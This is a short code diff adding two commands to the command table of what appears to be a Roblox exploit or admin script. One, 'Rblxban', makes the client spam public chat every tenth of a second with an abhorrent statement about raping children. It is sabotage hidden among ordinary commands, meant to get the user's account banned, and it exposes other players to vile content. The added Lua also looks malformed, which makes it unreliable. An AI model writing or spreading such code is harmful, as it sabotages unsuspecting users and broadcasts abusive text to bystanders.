@@ -6442,6 +6442,13 @@ local commands = {
 			end
 		end
 	end,
+        ["Lobby"] = function(args)
+  game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
+	end,
+        ["Rblxban"] = function(args)
+  while task.wait(0.1) do
+    game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("i rape children","All")
+	end,
 	["shutdown"] = function(args)
 		game:Shutdown()
 	end,
